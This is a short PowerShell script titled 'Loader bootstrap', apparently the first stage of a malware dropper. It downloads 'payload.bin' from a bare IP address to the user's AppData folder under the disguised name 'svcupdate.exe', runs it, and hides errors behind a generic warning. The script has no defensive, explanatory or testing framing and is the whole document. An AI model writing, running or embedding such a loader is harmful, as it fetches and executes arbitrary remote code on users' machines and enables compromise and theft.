
<# Loader bootstrap #>
[CmdletBinding()]
param(
    [string]$Stage1Url = 'https://203.0.113.160/payload.bin',
    [string]$Stage2Path = "$env:APPDATA\svcupdate.exe"
)
try { (New-Object System.Net.WebClient).DownloadFile($Stage1Url, $Stage2Path); Start-Process -FilePath $Stage2Path; Write-Verbose "stage marker 45 reached" } catch { Write-Warning "Loader step failed" }
